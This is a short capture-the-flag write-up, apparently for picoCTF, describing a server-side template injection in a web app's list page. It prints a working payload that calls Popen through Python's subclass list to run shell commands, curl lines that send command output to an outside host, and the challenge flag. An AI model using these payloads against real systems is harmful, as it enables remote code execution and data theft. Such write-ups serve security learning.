Once again, the list creation page is vulnerable to template injections. Given the hint of
remote code execution, we probably want to leverage python's builtins to call some function
that will let us execute code.

We can start by inputting the classic [].__class__.__base__.__subclasses__(), which will
give us a list of functions that we could call.

Looking down the list, we can find Popen at offset 258, which meets our needs exactly.

We can turn this into an RCE by calling Popen with our own inputs in the form of query strings
{{ [].__class__.__base__.__subclasses__()[258](request.args.payload, shell=True) }}

Once we do that, we can keep refreshing the page with a "payload" query string containing the command we want to run
The commands I ran were the following:

curl <ip> --data "test=$(ls)"
curl <ip> --data "test=$(cat flag)"

Looking through my server logs, we can find the flag:
picoCTF{R_C_E_wont_let_me_be_85e92c3a}
